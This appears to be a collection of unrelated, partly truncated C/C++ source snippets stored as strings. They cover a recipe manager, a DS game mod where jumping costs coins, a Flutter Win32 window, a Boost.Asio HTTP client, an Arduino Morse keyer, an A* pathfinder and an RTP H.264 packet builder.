if (recipe_name == recipe.recipe[0])\n        {\n            flag=1;\n            for (int i = 2; i < recipe.m - 2; ++i)\n        {\n            if (\"sugar\" == recipe.recipe[i])\n            flag=2;\n        }\n            if(flag==2){\n                cout<<\"you can't eat \"<<recipe.recipe[0]<<\" because of diabetes\"<<endl;\n            }\n            else if(flag==1){\n                 cout<<\"you can eat \"<<recipe.recipe[0]<<endl;\n            }\n            break; // No need to continue searching after finding the recipe\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"Recipe not found.\" << endl;\n    }\n    file.close();\n}\nvoid searchRecipe(const string &file_name, const string &recipe_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n        if (recipe_name == recipe.recipe[0])\n        {\n            flag = 1; // Recipe found\n            cout << \"Recipe Name: \" << recipe.recipe[0] << endl;\n            cout << \"Category: \" << recipe.recipe[1] << endl;\n            cout << \"Ingredients:\" << endl;\n            for (int i = 2; i < recipe.recipe.size(); ++i)\n            {\n                if (recipe.recipe[i] == \"directions\")\n                {\n                    cout << \"Directions :\" << endl;\n                }\n                else if (recipe.recipe[i] == \"Directions :\")\n                {\n                    continue;\n                }\n                else\n                    cout << \"-\"<<recipe.recipe[i] << endl;\n            }\n\n            break; // No need to continue searching after finding the recipe\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"Recipe not found.\" << endl;\n    }\n    file.close();\n}\nvoid display_recipe_category(const string &file_name) {\n    ifstream file(file_name);\n    if (!file.is_open()) {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n\n    string line;\n    while (getline(file, line)) {\n        Recipe recipe = add_line_in_vector(line);\n        cout << \"Recipe: \" << recipe.recipe[0] << \" - Category: \" << recipe.recipe[1] << endl;\n    }\n    \n    file.close();\n}\n\nvoid ingredientsearch(const string &file_name, const string &ingredient_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n        for (int i = 2; i < recipe.m - 2; ++i)\n        {\n            if (ingredient_name == recipe.recipe[i])\n            {\n                flag = 1;\n                cout << recipe.recipe[0] << endl;\n            }\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"No recipe contain these ingredients.\" << endl;\n    }\n    file.close();\n}\n\nvoid recipe_adder(const string &rec_name, const string &rec_type, const string &rec_ings, const string &rec_steps, ofstream &tracker)\n{\n    tracker << rec_name << \",\" << rec_type << \",\" << rec_ings << \",directions,\" << rec_steps << endl;\n    tracker.seekp(-1, ios_base::cur);   //to move to the file pointer to starting of the file\n}\n\nvoid recipe_deleter(const string& filename, const string& recipe_name) {\n    ifstream infile(filename);\n    if (!infile) {\n        cerr << \"Error: Unable to open file \" << filename << endl;  //error  meassage\n        return;\n    }\n    //creating vector to hold strings\n    vector<string> lines;\n    string line;\n    \n    while (getline(infile, line)) {\n    if (line.find(recipe_name) == string::npos) {\n        lines.push_back(line);\n    }\n    else\n    cout << \"Recipe has been deleted.\" << endl;\n    }\n\n    infile.close();\n    ofstream outfile(filen",
    "#include \"nsmb.hpp\"\n\n#define ALLOW_SUICIDE \t\ttrue\n#define COINS_PER_STARCOIN\t5\n\nstatic u16 jumpKeyPressed;\nstatic u16 jumpKeyHeld;\n\n#if ALLOW_SUICIDE\nncp_hook(0x020fd1d8,10) // suicide on Player::onUpdate if L and R held and player is coinless\nstatic void seppuku(Player* player) {\n\tif ((Game::getPlayerCoins(player->playerID) == 0) && \n\t\t((player->keysHeld & Keys::R) != 0) &&\n\t\t((player->keysHeld & Keys::L) != 0)) {\n\t\tGame::setPlayerDead(player->playerID,true);\n\t\tplayer->switchTransitionState(&Player::standardDeathTransitState);\n\t}\n}\n#endif\n\nncp_jump(0x0212c828,11) // replaces Player::getJumpKeysPressed\nstatic u16 noJumpPressWhenBroke(Player* player) {\n\tif (Game::getPlayerCoins(player->playerID) != 0)\n\t\tjumpKeyPressed = (player->keysPressed & (Keys::A | Keys::B)) != 0;\n\telse\n\t\tjumpKeyPressed = 0;\n\n\treturn jumpKeyPressed;\n\n}\n\nncp_jump(0x02155b6c,54) // replaces Trampoline::updateJumpBoostKeys \nstatic bool noSpringBoostWhenBroke(Trampoline* spring, Player& player, u8 playerID) {\n\tu16 doJumpBoost;\n\tif (spring->playerJumpBoost[playerID] == 0) {\n\t\tdoJumpBoost = player.getJumpKeysPressed();\n\t\tif (doJumpBoost != 0) \n\t\t\treturn true;\n\t} else {\n\t\tif (Game::getPlayerCoins(playerID) == 0) return false;\n\t\tdoJumpBoost = player.getJumpKeysHeld();\n\t\tif (doJumpBoost == 0) {\n\t\t\tspring->playerJumpBoost[playerID] = 0;\n\t\t\treturn true;\n\t\t}\n\n\t}\n\treturn false;\n}\n\nncp_hook(0x020fd0f0,10) // on Player::playJumpSFX\nstatic void loseCoinOnJumpSFX(Player* player) {\n\tif (Game::getPlayerCoins(player->playerID) != 0)\n\t\tGame::playerCoins[player->playerID] -= 1;\n}\n\nncp_hook(0x021132c0,10) // on wall jump ?\nstatic void loseCoinOnWallJump(Player* player) {\n\tif (Game::getPlayerCoins(player->playerID) != 0)\n\t\tGame::playerCoins[player->playerID] -= 1;\n}\n\n#if COINS_PER_STARCOIN\nncp_hook(0x02006868) // on StarCoin::SetCollected get 5 coins\nstatic void fiveCoinsOnStar() {\n\tfor (int i = 0; i < COINS_PER_STARCOIN; i++) {\n\t\tGame::addPlayerCoin(Game::localPlayerID);\n\t}\n}\n#endif\n\nncp_call(0x02183700,90) // no bouncy mushroom tall jump when broke \nstatic void loseCoinBounceShroom() {\n\tPlayer* player = Game::getPlayer(Game::localPlayerID);\n\tif (Game::getPlayerCoins(player->playerID) != 0) {\n\t\tplayer->doTallJump(0x4c00,0x10,false,true,0);\n\t\tGame::playerCoins[Game::localPlayerID] -= 1;\n\t}\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\n#include <boost/asio/any_io_executor.hpp>\n#include <boost/asio/async_result.hpp>\n#include <boost/asio/awaitable.hpp>\n#include <boost/asio/bind_allocator.hpp>\n#include <boost/asio/buffer.hpp>\n#include <boost/asio/co_spawn.hpp>\n#include <boost/asio/connect.hpp>\n#include <boost/asio/deferred.hpp>\n#include <boost/asio/io_context.hpp>\n#include <boost/asio/ip/address.hpp>\n#include <boost/asio/ip/tcp.hpp>\n#include <boost/asio/read_until.hpp>\n#include <boost/asio/this_coro.hpp>\n#include <boost/asio/write.hpp>\n\n#include <cstddef>\n#include <iostream>\n#include <string>\n#include <string_view>\n\nnamespace asio = boost::asio;\n\n// The GET HTTP request to send to the server\nstatic constexpr std::string_view request =\n    \"GET / HTTP/1.1\\r\\n\"\n    \"Host: example.com\\r\\n\"\n    \"User-Agent: Asio\\r\\n\"\n    \"Accept: */*\\r\\n\\r\\n\";\n\n// A custom allocator that logs allocation and deallocation requests\ntemplate <class T>\nstruct custom_allocator\n{\n    using value_type = T;\n\n    custom_allocator() = default;\n\n    template <class U>\n    constexpr custom_allocator(const custom_allocator<U>&) noexcept\n    {\n    }\n\n    T* allocate(std::size_t n)\n    {\n        std::cout << \"Allocate \" << n * sizeof(T) << \" bytes\\n\";\n        return std::allocator<T>().allocate(n);\n    }\n    void deallocate(T* p, std::size_t n)\n    {\n        std::cout << \"Deallocate \" << n * sizeof(T) << \"bytes\\n\";\n        return std::allocator<T>().deallocate(p, n);\n    }\n};\n\nasio::awaitable<void> handle_request_impl()\n{\n    // Coroutines know which executor are using\n    asio::any_io_executor ex = co_await asio::this_coro::executor;\n\n    // I/O objects\n    asio::ip::tcp::socket sock(ex);\n    asio::ip::tcp::resolver resolv(ex);\n\n    // A completion token with an associated allocator\n    auto tok = asio::bind_allocator(custom_allocator<void>(), asio::deferred);\n\n    // Resolve the hostname and port into a set of endpoints\n    auto endpoints = co_await resolv.async_resolve(\"example.com\", \"80\", tok);\n\n    // Connect to the server\n    co_await asio::async_connect(sock, endpoints, tok);\n\n    // Write the request\n    co_await asio::async_write(sock, asio::buffer(request), tok);\n\n    // Read the response\n    std::string buff;\n    std::size_t\n        bytes_read = co_await asio::async_read_until(sock, asio::dynamic_buffer(buff), \"\\r\\n\\r\\n\", tok);\n    std::cout << std::string_view(buff.data(), bytes_read) << std::endl;\n}\n\nvoid handle_request(asio::any_io_executor ex)\n{\n    // Rethrow exceptions originated in the coroutine\n    asio::co_spawn(ex, handle_request_impl, [](std::exception_ptr exc) {\n        if (exc)\n            std::rethrow_exception(exc);\n    });\n}\n\nint main()\n{\n    asio::io_context ctx;\n    handle_request(ctx.get_executor());\n    ctx.run();\n}",
    "#include \"button.h\"\n// button\nbool keyboardEnabled = true;\nunsigned long buttonPressedTime = 0;\nconst unsigned long longPressTime = 2000;\n\nString morseCode = \"\"; // \u66ab\u5b58\u6469\u65af\u96fb\u78bc\n\nvoid buttonEvent()\n{\n    if (digitalRead(BUTTON_DI) == LOW && digitalRead(BUTTON_DAH) == LOW)\n    {\n        if (buttonPressedTime == 0)\n        {\n            buttonPressedTime = millis();\n        }\n        else if (millis() - buttonPressedTime > longPressTime)\n        {\n            keyboardEnabled = !keyboardEnabled;\n            buttonPressedTime = 0;\n            if (keyboardEnabled)\n            {\n                Serial.println(\"Keyboard enabled.\");\n            }\n            else\n            {\n                Serial.println(\"Keyboard disabled.\");\n            }\n        }\n    }\n    else\n    {\n        buttonPressedTime = 0;\n    }\n    if (keyboardEnabled)\n    {\n        // \u5982\u679cBUTTON_DI\u88ab\u6309\u4e0b\uff0c\u6dfb\u52a0\".\"\u5230morseCode\u5b57\u7b26\u4e32\n        if (digitalRead(BUTTON_DI) == LOW && digitalRead(BUTTON_DAH) == HIGH)\n        {\n            Serial.print(\".\");\n            drawMorseCode('\\0');\n            if (morseCode.length() > MAX_MORSE_CODE_LENGTH)\n            {\n                Serial.println(\"\\nError: Morse Code too long\");\n                morseCode = \"\"; // \u6e05\u7a7amorseCode\u5b57\u7b26\u4e32\n                drawClear();\n            }\n            else\n            {\n                morseCode += \".\"; // \u7d2f\u79ef\u6469\u65af\u7535\u7801\n            }\n            di();\n        }\n        // \u5982\u679cBUTTON_DAH\u88ab\u6309\u4e0b\uff0c\u6dfb\u52a0\"-\"\u5230morseCode\u5b57\u7b26\u4e32\n        else if (digitalRead(BUTTON_DAH) == LOW && digitalRead(BUTTON_DI) == HIGH)\n        {\n            Serial.print(\"-\");\n            drawMorseCode('\\0');\n\n            if (morseCode.length() > MAX_MORSE_CODE_LENGTH)\n            {\n                Serial.println(\"\\nError: Morse Code too long\");\n                morseCode = \"\"; // \u6e05\u7a7amorseCode\u5b57\u7b26\u4e32\n                drawClear();\n            }\n            else\n            {\n                morseCode += \"-\"; // \u7d2f\u79ef\u6469\u65af\u7535\u7801\n            }\n            dah();\n        }\n\n        else if (!morseCode.isEmpty() && digitalRead(BUTTON_DI) == HIGH && digitalRead(BUTTON_DAH) == HIGH)\n        {\n            // Serial.print(\"morseCodeRaw: \");\n            // Serial.println(morseCode);\n            char decodedChar = cw_morse2char_proc(morseCode); // \u89e3\u6790\u6469\u65af\u7535\u7801\n            if (decodedChar != '\\0')\n            {\n                Serial.println();\n                Serial.print(\"Decoded: \");\n                Serial.println(decodedChar); // \u6253\u5370\u89e3\u6790\u7ed3\u679c\n                drawMorseCode(decodedChar);\n            }\n            else\n            { // \u5982\u679c\u89e3\u6790\u5931\u8d25\n                Serial.println(\"\\nError: Unknown Morse Code\");\n#ifdef BUZZER_ENABLE\n                tone(PIN_SP, err_hz);\n                delay(duration * 2);\n                noTone(PIN_SP);\n#endif\n            }\n            morseCode = \"\";\n            delay(duration);\n        }\n    }\n}",
    "#include<iostream>\n#include<vector>\n#include<string.h>\n#include<queue>\n#include<fstream>\nconst int N = 200;\nbool vis[N][N]; // // A*\u7b97\u6cd5\u4e2d\u68c0\u6d4b\u662f\u5426\u8d70\u8fc7\u6b64\u8def\u5f84\nconst int n=N;// \u5730\u56fe\u7684\u5927\u5c0f, \u8fd9\u91cc\u6700\u5927\u4e0d\u80fd\u8d85\u8fc7N\u8fd9\u4e2a\u5e38\u91cf\u7684\u503c\n\nchar Map[N][N];\t\t// \u8f93\u5165\u7684\u5730\u56fe\nclass Position {\npublic:\n\tint x;\n\tint y;\n\tPosition(int x, int y) {\n\t\tthis->x = x;\n\t\tthis->y = y;\n\t}\n\tPosition() {\n\t\tx = -1;\n\t\ty = -1;\n\t}\n\tbool operator==(const Position &a) {\n\t\treturn (this->x == a.x) && (this->y == a.y);\n\t}\n};\nclass Point {\npublic:\n\tint x, y;\n\tint f, g, h;\n\tbool operator==(const Point& pos) {\n\t\treturn (pos.x == x && pos.y == y);\n\t}\n\tPoint(const Position& pos) {\n\t\tx = pos.x;\n\t\ty = pos.y;\n\t}\n\tPoint() {\t}\n\tvoid geth(Point beginpos, Point endpos) {\n\t\tint x = std::abs(beginpos.x = endpos.x);\n\t\tint y = std::abs(beginpos.y - endpos.y);\n\t\th = x + y;\n\t}\n\t\n\tvoid getf() {\n\t\tf = g + h;\n\t}\n};\nclass TreeNode {\n\t\npublic:\n\tPoint pos;\n\tTreeNode* pParent;\n\tstd::vector<TreeNode*> pChild;\n\t\n\t\n\tTreeNode(Point pos) {\n\t\tthis->pos = pos;\n\t\tpParent = nullptr;\n\t}\n};\nbool CanWalk(char ch[N][N], bool vis[N][N], const Point& pos)\n{\n\t//\u5982\u679c\u8d8a\u754c\uff0c\u4e0d\u80fd\u8d70\n\tif (pos.x <= 0 || pos.y <= 0 || pos.x > n || pos.y > n)\n\t{\n\t\treturn false;\n\t}\n\t//\u8d8a\u754c\n\t\n\tif (ch[pos.x][pos.y] =='#'||ch[pos.x][pos.y]=='*'|| ch[pos.x][pos.y] == 'A')// \u540e\u9762\u9700\u8981\u4fee\u6539, \u6b64\u5904\u68c0\u6d4b\u662f\u5426\u5904\u4e8e\u7a7a\u5730, \u540e\u7eed\u9700\u8981\u8003\u8651\u5bfb\u8def\u65f6\u8def\u4e0a\u7684\u673a\u5668\u4eba\n\t{\n\t\treturn false;\n\t}\n\t\n\tif (vis[pos.x][pos.y])\n\t{\n\t\treturn false;\n\t}\n\treturn true;//\u5426\u5219\u80fd\u8d70\n}\n\n\n\n\nstd::vector<Position> GetPathbyPosition(Position start, Position end) {\n\t//\u8fd4\u56de\u4e00\u4e2avector, \u5176\u4e2d\n\t//0\u4ee3\u8868\u5411\u53f3\n\t//1\u4ee3\u8868\u5411\u5de6\n\t//3\u4ee3\u8868\u5411\u4e0b\n\t//2\u4ee3\u8868\u5411\u4e0a \n\t//\u5982\u679c\u9700\u8981\u5f97\u5230\u4e24\u70b9\u95f4\u66fc\u54c8\u987f\u8ddd\u79bb\u83b7\u53d6vector\u7684size\u5373\u53ef\n\t//\u521d\u59cb\u5316\u90e8\u5206\n\tmemset(vis, false, sizeof(vis));\n\tPoint beginpos(start);\n\tPoint endpos(end);\n\tTreeNode* pRoot = new TreeNode(beginpos);\n\tstruct cmp {\n\t\tbool operator()(const TreeNode* a, const TreeNode*b) {\n\t\t\treturn a->pos.f > b->pos.f;\n\t\t}\n\t};\n\tstd::priority_queue<TreeNode*,std::vector<TreeNode*>,cmp> buff;//\u6682\u5b58\u63a2\u7d22\u8fc7\u7684\u70b9\n\tTreeNode* pCurrent = pRoot;\n\tTreeNode* pTemp = nullptr;\n\tbool isfind = false;\n\t//\u521d\u59cb\u5316\u7ed3\u675f\n\tstd::vector<Position> Path;\n\t\n\twhile (1) {\n\t\t\n\t\t\n\t\tfor (int i = 0; i <= 3; i++) {\n\t\t\tpTemp = new TreeNode(pCurrent->pos);\n\t\t\tswitch (i)\n\t\t\t{\n\t\t\t\tcase 2://up\n\t\t\t\tpTemp->pos.x--;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\tcase 3://down\n\t\t\t\tpTemp->pos.x++;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\tcase 1://left\n\t\t\t\tpTemp->pos.y--;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\tcase 0://right\n\t\t\t\tpTemp->pos.y++;\n\t\t\t\tpTemp->pos.g += 1;\n\t\t\t\tbreak;\n\t\t\t\t\n\t\t\t}\n\t\t\tif (CanWalk(Map, vis, pTemp->pos)) {\n\t\t\t\tpTemp->pos.geth(pTemp->pos, endpos);\n\t\t\t\tpTemp->pos.getf();\n\t\t\t\tpCurrent->pChild.push_back(pTemp);\n\t\t\t\tpTemp->pParent = pCurrent;\n\t\t\t\tbuff.push(pTemp);\n\t\t\t\t\n\t\t\t\tvis[pTemp->pos.x][pTemp->pos.y] = true;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tdelete pTemp;\n\t\t\t\tpTemp = nullptr;\n\t\t\t}\n\t\t}\n\t\t\n\t\tif (buff.size()==0) {\n\t\t\t//\u5982\u679c\u5bfb\u627e\u5931\u8d25,\u65e0\u8def\u53ef\u8d70\n\t\t\treturn std::vector<Position>();\n\t\t}\n\t\t\n\t\telse {\n\t\t\tpCurrent = buff.top();\n\t\t\tbuff.pop();//\u5f39\u51fa\u8be5\u70b9, \u8bf4\u660e\u5176\u5df2\u7ecf\u88ab\u5bfb\u627e\u8fc7\n\t\t}\n\t\t\n\t\tif (pCurrent->pos == endpos) {//\u627e\u5230\u4e86\n\t\t\tisfind = true;\n\t\t\t\n\t\t\tbreak;\n\t\t}\n\t\t\n\t}\n\t\n\tif (isfind) {\n\t\twhile (pCurrent != nullptr) {\n\t\t\tPosition tmp(pCurrent->pos.x, pCurrent->pos.y);\n\t\t\tPath.push_back(tmp);\n\t\t\tpCurrent = pCurrent->pParent;\n\t\t}\n\t\t\n\t}\n\t\n\treturn Path;\n}\n\nstd::vector<std::string>ConvertToOperationCodeByPostion(std::vector<Position> Path, std::string opCode[4] ){\n\t\n\t\n\t\n\tstd::vector<std::string>anspath;\n\tPosition startcpy = Path.back();\n\tPath.pop_back();\n\twhile (!Path.empty()) {\n\t\tauto tmp = Path.back();\n\t\tPath.pop_back();\n\t\tif ((startcpy.x - tmp.x) > 0) {\n\t\t\t\n\t\t\tanspath.push_back(opCode[2]);\t\n\t\t}\n\t\telse if ((startcpy.x - tmp.x) < 0) {\n\t\t\tanspath.push_back(opCode[3]);\n\t\t}\n\t\telse if ((startcpy.y - tmp.y) > 0) {\n\t\t\tanspath.push_back(opCode[1]);\n\t\t}\n\t\telse if ((startcpy.y - tmp.y) < 0) {\n\t\t\tanspath.push_back(opCode[0]);\n\t\t}\n\t\tstartcpy = tmp;\n\t}\n\treturn anspath;\n}\n\nint main(int argc, char *argv[]){\n\t\n\t// if not assign opCode \n\t// \t\tuse default opCode\n\tstd::string opCode[5]={\"0\",\"1\",\"2\",\"3\"};  \n\t//2 means up  ,3 means down ,0 means right ,1 means left  \n\t\n\t\n\tstd::string mapdir;\n\tPosition s;\n\tPosition e;\n\tint mer=0,der=0;\n\t\n\tfor (int i = 1; i < argc; ++i) {\n\t\tstd::string arg = argv[i];\n\t\tif (arg == \"-m\") {\n\t\t\tmer++;\n\t\t\tif (i + 1 < argc) { // \u786e\u4fdd\u540e\u9762\u6709\u53c2\u6570\n\t\t\t\tmapdir = argv[++i]; // \u83b7\u53d6\u53c2\u6570\u5e76\u589e\u52a0i\n\t\t\t} else {\n\t\t\t\tstd::cerr << \"argument error\" << std::endl;\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t\tstd::fstream mp(mapdir,std::ios::in);\n\t\t\t\n\t\t\tif(!mp){\n\t\t\t\tstd::cerr<<\"invalid map dirction\\n\";\n\t\t\t\t\n\t\t\t}\n\t\t\tfor (int i = 0; i < n; i++) {\n\t\t\t\tfor (int j = 0; j < n; j++) {\n\t\t\t\t\tmp >> Map[i][j];\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t\n\t\t}\n\t\telse if (arg == \"-d\") {\n\t\t\tder++;\n\t\t\tif (i + 4 < argc) { \n\t\t\t\tint sx = std::stoi( argv[++i]);\n\t\t\t\tint sy = std::stoi(argv[++i]);\n\t\t\t\tint ex =std::stoi( argv[++i]);\n\t\t\t\tint ey =std::stoi( argv[++i]);\n\t\t\t\ts=Position(sx,sy);\n\t\t\t\te=Position(ex,ey);\n\t\t\t\t\n\t\t\t\t\n\t\t\t\t\n\t\t\t} else {\n\t\t\t\tstd::cerr << \"argument error\" << std::endl;\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t}\n\t\n\t\n\t\n\t\n\tauto p=GetPathbyPosition(s,e);\t\n\t\n\tstd::fstream ans(\"./ans.txt\",std::ios::out);\n\t\n\t\t\n\tfor(auto i:p){\n\t\tans<<\"(\"<<i.x<<\",\"<<i.y<<\") \";\n\t} \n\tans<<std::endl;\n\tauto o=ConvertToOperationCodeByPostion(p,opCode",
    "#include \"rtp_h264_packet_builder.h\"\r\n\r\n#include <algorithm>\r\n#include <string.h>\r\n#include <sys/types.h>\r\n\r\n#ifdef _WIN32\n#include <winsock2.h>\n#else\n#include <arpa/inet.h>\n#endif\r\n\r\n#include \"common_logger.h\"\r\n#include \"codec_utils.h\"\r\n\r\nRTPH264PacketBuilder::RTPH264PacketBuilder()\r\n{\r\n\tm_ssrc = 0;\r\n\tm_load_type = 0;\r\n\tm_sequence = 0;\r\n\tm_timestamp = 0;\r\n\tm_ntp_timestamp = 0;\r\n\tm_marker = false;\r\n\r\n\tm_rtp_buffer = NULL;\r\n\tm_rtp_buffer_end = NULL;\r\n\tm_current_pos = NULL;\r\n\r\n\tm_initialize = false;\r\n}\r\n\r\nRTPH264PacketBuilder::~RTPH264PacketBuilder()\r\n{\r\n\tif (m_rtp_buffer)\r\n\t{\r\n\t\tdelete[] m_rtp_buffer;\r\n\t\tm_rtp_buffer = NULL;\r\n\t}\r\n}\r\n\r\nbool RTPH264PacketBuilder::init(uint16_t sequenceStart, uint32_t timestampStart)\r\n{\r\n\tif (m_initialize)\r\n\t{\r\n\t\treturn true;\r\n\t}\r\n\r\n\tm_rtp_buffer = new (std::nothrow)uint8_t[RTP_PACKETS_BUFFER_SIZE];\r\n\tif (!m_rtp_buffer)\r\n\t{\r\n\t\tLOG_ERROR(\"RTPPacketBuilder::Init(), out of memory\");\r\n\t\treturn false;\r\n\t}\r\n\tm_rtp_buffer_end = m_rtp_buffer + RTP_PACKETS_BUFFER_SIZE;\r\n\r\n\tthis->m_sequence = sequenceStart;\r\n\tthis->m_timestamp = timestampStart;\r\n\r\n\tm_initialize = true;\r\n\treturn true;\r\n}\r\n\r\nvoid RTPH264PacketBuilder::set_ssrc(uint32_t newssrc)\r\n{\r\n\tthis->m_ssrc = newssrc;\r\n}\r\n\r\nuint32_t RTPH264PacketBuilder::get_ssrc() const\r\n{\r\n\treturn this->m_ssrc;\r\n}\r\n\r\nvoid RTPH264PacketBuilder::increment_timestamp_by(uint32_t inc)\r\n{\r\n\tthis->m_timestamp += inc;\r\n}\r\n\r\nbool RTPH264PacketBuilder::build_fua_packet(const uint8_t* data, int len,\r\n\tstd::vector<std::pair<const uint8_t*, int> >& rtpvec)\r\n{\r\n\tconst uint8_t fnri = data[0] & 0xE0;\r\n\tconst uint8_t type = data[0] & 0x1F;\r\n\tbool isStart = true;\r\n\tdata++;\r\n\tlen--;\r\n\r\n\tint leftLen = len;\r\n\r\n\twhile (true)\r\n\t{\r\n\t\tif (m_current_pos + sizeof(RTPHeader) + sizeof(RTPExtensionHeader) >= m_rtp_buffer_end)\r\n\t\t{\r\n\t\t\treturn false;\r\n\t\t}\r\n\r\n\t\tconst uint8_t* const start = m_current_pos;\r\n\r\n\t\tRTPHeader* rtpHeader = (RTPHeader*)m_current_pos;\r\n\t\trtpHeader->version = 2;\r\n\t\trtpHeader->padding = 0;\r\n\t\trtpHeader->extension = 1;\r\n\t\trtpHeader->csrcCount = 0;\r\n\t\trtpHeader->payloadType = 96;\r\n\t\trtpHeader->marker = 0;\r\n\t\trtpHeader->sequence = htons((uint16_t)(m_sequence & 0x0000FFFF));\r\n\t\trtpHeader->timestamp = htonl(this->m_timestamp);\r\n\t\trtpHeader->ssrc = htonl(this->m_ssrc);\r\n\r\n\t\tRTPExtensionHeader* extHeader = (RTPExtensionHeader*)(m_current_pos + sizeof(RTPHeader));\r\n\t\textHeader->id = 0;\r\n\t\textHeader->length = htons(3);\r\n\t\textHeader->reserved = 0;\r\n\t\textHeader->seqHigh16 = htons((uint16_t)((m_sequence >> 16) & 0x0000FFFF));\r\n\t\textHeader->msw = 0;\r\n\t\textHeader->lsw = 0;\r\n\r\n\t\tm_current_pos += sizeof(RTPHeader) + 